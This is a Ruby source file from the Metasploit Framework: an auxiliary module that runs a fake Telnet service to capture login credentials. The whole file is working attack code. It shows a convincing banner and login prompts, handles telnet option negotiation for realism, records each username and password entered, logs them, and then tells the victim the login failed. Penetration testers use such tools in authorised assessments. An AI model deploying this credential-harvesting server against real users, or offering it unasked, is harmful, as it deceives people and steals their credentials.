##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

# Fake Telnet Service - Kris Katterjohn 09/28/2008
class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::TcpServer
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'           => 'Authentication Capture: Telnet',
			'Description'    => %q{
				This module provides a fake Telnet service that
			is designed to capture authentication credentials.  DONTs
			and WONTs are sent to the client for all option negotiations,
			except for ECHO at the time of the password prompt since
			the server controls that for a bit more realism.
			},
			'Author'         => 'kris katterjohn',
			'License'        => MSF_LICENSE,
			'Actions'        => [ [ 'Capture' ] ],
			'PassiveActions' => [ 'Capture' ],
			'DefaultAction'  => 'Capture'
		)

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The local port to listen on.", 23 ])
			], self.class)
	end

	def setup
		super
		@state = {}
	end

	def run
		print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
		exploit()
	end

	def on_client_connect(c)
		@state[c] = {
			:name    => "#{c.peerhost}:#{c.peerport}",
			:ip      => c.peerhost,
			:port    => c.peerport,
			:user    => nil,
			:pass    => nil,
			:gotuser => false,
			:gotpass => false,
			:started => false
		}
	end

	def on_client_data(c)
		data = c.get_once

		return if not data

		offset = 0

		if data[0] == 0xff
			0.step(data.size, 3) do |x|
				break if data[x] != 0xff

				# Answer DONT/WONT for WILL/WONTs and DO/DONTs,
				# except for echoing which we WILL control for
				# the password

				reply = "\xffX#{data[x + 2].chr}"

				if @state[c][:pass] and data[x + 2] == 0x01
					reply[1] = "\xfb"
				elsif data[x + 1] == 0xfb or data[x + 1] == 0xfc
					reply[1] = "\xfe"
				elsif data[x + 1] == 0xfd or data[x + 1] == 0xfe
					reply[1] = "\xfc"
				end

				c.put reply

				offset += 3
			end
		end

		if not @state[c][:started]
			c.put "\r\nWelcome.\r\n\r\n"
			@state[c][:started] = true
		end

		if @state[c][:user].nil?
			c.put "Login: "
			@state[c][:user] = ""
			return
		end

		return if offset >= data.size

		data = data[offset, data.size]

		if not @state[c][:gotuser]
			@state[c][:user] = data.strip
			@state[c][:gotuser] = true
			c.put "\xff\xfb\x01" # WILL ECHO
		end

		if @state[c][:pass].nil?
			c.put "Password: "
			@state[c][:pass] = ""
			return
		end

		if not @state[c][:gotpass]
			@state[c][:pass] = data.strip
			@state[c][:gotpass] = true
			c.put "\x00\r\n"
		end

		report_auth_info(
			:host      => @state[c][:ip],
			:port      => datastore['SRVPORT'],
			:sname     => 'telnet',
			:user      => @state[c][:user],
			:pass      => @state[c][:pass],
			:source_type => "captured",
			:active    => true
		)

		print_status("TELNET LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")

		c.put "\r\nLogin failed\r\n\r\n"

		c.close
	end

	def on_client_close(c)
		@state.delete(c)
	end
end
